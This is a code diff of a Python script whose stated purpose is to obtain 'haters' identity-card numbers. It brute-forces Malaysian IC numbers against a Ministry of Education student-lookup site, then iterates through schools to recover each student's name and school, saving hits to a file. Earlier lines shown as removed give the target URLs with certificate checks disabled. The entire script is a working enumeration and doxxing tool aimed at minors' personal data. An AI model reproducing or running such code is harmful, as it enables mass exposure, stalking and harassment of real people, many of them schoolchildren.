@@ -1,180 +1,126 @@
-# Purpose : To get my haters IC numbers
+# Purpose : To get all my haters IC numbers
 # Programmer : Asuna
-# Version 1.9
+# Version 1.9.5
 
 import os
 import sys
-import platform
-import requests
-import urllib3
+import time
+import datetime
 
-from bs4 import BeautifulSoup
-from urllib.request import urlopen
-
-from _GetDetails_ import clear_screen, GetPlacesOfBirth, GetAreas, GetSchools
-
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+from _GetDetails_ import ClearScreen, _PlacesOfBirth, _Areas, _Schools, _Get
 
 
-def get_four_digits_number(i) :
-    if gender in ("male", "female"):
-        if gender == "male" :
-            if i%2 != 0 :
-                four_digits_number = (f'{i:04}')
-                return four_digits_number
-        elif gender == "female" :
-            if i%2 == 0 :
-                four_digits_number = (f'{i:04}')
-                return four_digits_number
-    else :
-        four_digits_number = (f'{i:04}')
-        return four_digits_number
-
-
-def write_in_file() :
-    if "Not Existing" not in response :
-        with open (os.path.join(sys.path[0], 'identity_numbers.txt'), 'a', encoding='utf-8') as f:
-            identity_numbers.append(response)
-            f.write(response + "\n")
-
-
-def get_response(school_code, birth_date, place_of_birth, four_digits_number, schools) :
+def ValidateDatetime(Date):
+    try :
+        datetime.datetime.strptime(Date, '%y%m%d')
+        return True
+    except ValueError:
+        return False
     
-    session = requests.Session()
-    
-    while four_digits_number != None :
-        if school_code == None :
-            response = session.get( f"https://sapsnkra.moe.gov.my/ajax/papar_carian.php?nokp={birth_date}{place_of_birth}{four_digits_number}", verify = False)
-            
-            if ("Tidak Wujud" not in response.text) : 
-                answer = str (birth_date + place_of_birth + four_digits_number + "\tExisting!!!\t   Now going to search for his/her name and school")
-                
-            else : 
-                answer = str (birth_date + place_of_birth + four_digits_number + "\tNot Existing")
-                
-            return answer
-        
-        elif school_code != None :
-            response = session.get( f"https://sapsnkra.moe.gov.my/ajax/papar_carianpelajar.php?nokp={birth_date}{place_of_birth}{four_digits_number}&kodsek={school_code}", verify = False)
-            
-            if ("Tidak Wujud" not in response.text) : 
-                
-                name_html = session.get("https://sapsnkra.moe.gov.my/ibubapa2/semak.php", verify = False)
-                
-                soup = BeautifulSoup(name_html.text, 'lxml')
-                name = ((soup.find(lambda t: t.text.strip()=='NAMA MURID')).find_next('td')).find_next('td')
-                
-                answer = str ("-"*10 + birth_date + place_of_birth + four_digits_number + "\t" + school_code + "\t   " + schools[1][schools[0].index(school_code)] + "\t   " + name.text + "-"*10)
-                
-            else : 
-                answer = str (birth_date + place_of_birth + four_digits_number + "\t" + school_code + "\t   " + schools[1][schools[0].index(school_code)] + "\t   Not Existing")
-                
-            return answer
+def FileDump(Response) :
+    if "Not Existing" not in Response :
+        with open (os.path.join(sys.path[0], "Results.txt"), "a+", encoding = "utf-8") as f:
+            f.write(Response + "\n")
         
 
 if __name__ == "__main__" :
     
-    identity_numbers = []
+    ClearScreen()
+    while True :
+        BirthDate = str ( input( "Please enter the birth date : (031231) "))
+        if ValidateDatetime(BirthDate) :
+            break
+    while True :
+        UserInputPlaceCode = str ( input( "Please enter the place of birth : (13)(If no just keep it blank) "))
+        if _Get.VerifyCode(UserInputPlaceCode) :
+            break
+    while True :
+        Gender = str ( input( "Please enter the gender : (Female)(If no just keep it blank) ")).upper()
+        if Gender in ("MALE", "FEMALE", "") :
+            break
+    while True :
+        UserInputSchoolCode = str ( input( "Please enter the school code : (YCC4102)(If no just keep it blank) ")).upper()
+        if _Get.VerifyCode(UserInputSchoolCode) or UserInputSchoolCode == "" :
+            break
     
-    try :
-        clear_screen()
-        print ("!!!!! ALTHOUGH THE PROGRAM WILL SEARCH EVERYTHING FOR YOU, BUT IT WILL TAKE LONG TIMES DEPEND ON HOW MUCH DETAILS YOU HAD ENTERED !!!!!")
-        birth_date = str (input("Please enter the birth date : (030531) "))
-        user_input_place_code = str (input("Please enter the place of birth : (13)(If no just keep it blank) "))
-        gender = str (input("Please enter the gender : (female)(If no just keep it blank) "))
-        user_input_school_code = str (input("Please enter the school code : (YCC4102)(If no just keep it blank) ")) #YCC4102
-    except Exception :
-        input (Exception, "\nPress Enter to restart ...")
-
+    ExistingList = []
+    Output = True
     
-    places = GetPlacesOfBirth.get_pb() # Return ([Place Code], [Place Name])
-    if user_input_place_code not in places[0] :
+    if _Get.VerifyCode(UserInputPlaceCode) : # If PlaceOfBirth Code entered by user is valid
         
-        for place_code in places[0] :
-            for i in range(10000) :
-                        
-                four_digits_number = get_four_digits_number(i)
-                response = get_response(None, birth_date, place_code, four_digits_number, None)
-                
-                if response == None :
-                    pass
-                
-                else :
-                    print(response)
-                    write_in_file()
-                    
-                    if "Not Existing" not in response :
-                        areas = GetAreas.get_area(place_code) # Return ([Area Code], [Area Name])
-                        
-                        for area_code in areas[0] :
-                            schools = GetSchools.get_school(place_code, area_code) # Return ([School Code], [School Name])
-                            
-                            if user_input_school_code in schools[0] :
-                                four_digits_number = get_four_digits_number(i)
-                                response = get_response(user_input_school_code, birth_date, place_code, four_digits_number, schools)
-                                
-                                if response == None :
-                                    pass
-                                else :
-                                    print(response)
-                                    write_in_file()
-                                    
-                            else :
-                                for school_code in schools[0] :
-                                    for i in range(10000) :
-                                        
-                                        four_digits_number = get_four_digits_number(i)
-                                        response = get_response(school_code, birth_date, place_code, four_digits_number, schools)
-                                        
-                                        if response == None :
-                                            pass
-                                        else :
-                                            print(response)
-                                            write_in_file()
-                                            
-                                        
-    elif user_input_place_code in places[0] :
-        for i in range(10000) :
+        if _Get.VerifyCode(UserInputSchoolCode) : # If School Code entered by user is valid
+            pass
+        
+        if not _Get.VerifyCode(UserInputSchoolCode) : # If School Code entered by user is invalid
+            Areas = _Areas(UserInputPlaceCode).Response() # return (AreasCodeList, AreasNameList)
             
-            four_digits_number = get_four_digits_number(i)
-            response = get_response(None, birth_date, user_input_place_code, four_digits_number, None)
-            
-            if response == None :
-                    pass
-                
-            else :
-                print(response)
-                write_in_file()
-                
-                if "Not Existing" not in response :
-                    areas = GetAreas.get_area(user_input_place_code) # Return ([Area Code], [Area Name])
+            for i in range(10000) : 
+                if Output :
+                    ClearScreen()
+                    print ("\tGot'cha Response --\n")
                     
-                    for area_code in areas[0] :
-                        schools = GetSchools.get_school(user_input_place_code, area_code) # Return ([School Code], [School Name])
+                    if not ExistingList :
+                        print ("\tEmpty~~ :(\n")
                         
-                        if user_input_school_code in schools[0] :
-                            four_digits_number = get_four_digits_number(i)
-                            response = get_response(user_input_school_code, birth_date, user_input_place_code, four_digits_number, schools)
+                    for Existing in ExistingList :
+                        print ( f"\t{Existing}\n")
+                        
+                    print ("\t", "-"*20, "\n")
+                    Output = False
+                
+                FourDigitsNumber = _Get.FourDigitsNumber(i, Gender)
+                if FourDigitsNumber == None :
+                    continue
+                
+                InitResponse = _Get()
+                Response = InitResponse.Response(BirthDate, UserInputPlaceCode, FourDigitsNumber)
+                if "Not Existing" in Response : 
+                    
+                    print ("  "*100, end = "\r") # Clear Last Line
+                    print ( f"Current Progress : {Response}", end = "\r")
+                    continue
+                
+                print ("  "*100, end = "\r") # Clear Last Line
+                print ( f"Current Progress : {Response} is existing. Now will find this user name through finding user school", end = "\r")
+                
+                time.sleep(5)
+            
+                for AreaCode in Areas[0] :
+                    Schools = _Schools(UserInputPlaceCode, AreaCode).Response() # return (SchoolsCodeList, SchoolsNameList)
+                    
+                    for SchoolCode in Schools[0] :
+                        if Output :
+                            ClearScreen()
+                            print ("\tGot'cha Response --\n")
                             
-                            if response == None :
-                                pass
-                            else :
-                                print(response)
-                                write_in_file()
+                            if not ExistingList :
+                                print ("\tEmpty~~ :(\n")
                                 
-                        else :
-                            for school_code in schools[0] :
-                                for i in range(10000) :
-                                    
-                                    four_digits_number = get_four_digits_number(i)
-                                    response = get_response(school_code, birth_date, user_input_place_code, four_digits_number, schools)
-                                    
-                                    if response == None :
-                                        pass
-                                    else :
-                                        print(response)
-                                        write_in_file()
-                                        
-                                        
-    for existed in identity_numbers :
-        print (existed)
+                            for Existing in ExistingList :
+                                print ( f"\t{Existing}\n")
+                                
+                            print ("\t", "-"*20, "\n")
+                            Output = False
+                            
+                        InitResponseWithSchool = _Get(SchoolCode = SchoolCode)
+                        ResponseWithSchool = InitResponseWithSchool.Response(BirthDate, UserInputPlaceCode, FourDigitsNumber)
+                        
+                        if "Not Existing" in ResponseWithSchool : 
+                            
+                            print ("  "*100, end = "\r") # Clear Last Line
+                            print ( f"Current Progress : {ResponseWithSchool}", end = "\r")
+                            continue
+                        
+                        print ("  "*100, end = "\r") # Clear Last Line
+                        print ( f"Current Progress : {ResponseWithSchool}", end = "\r")
+                        FileDump(ResponseWithSchool)
+                        ExistingList.append(ResponseWithSchool)
+                        Output = True
+                        time.sleep(3)
+                    
+    if not _Get.VerifyCode(UserInputPlaceCode) : # If PlaceOfBirth Code entered by user is invalid
+        
+        if _Get.VerifyCode(UserInputSchoolCode) : # If School Code entered by user is valid
+            pass
+        if not _Get.VerifyCode(UserInputSchoolCode) : # If School Code entered by user is invalid
+            pass
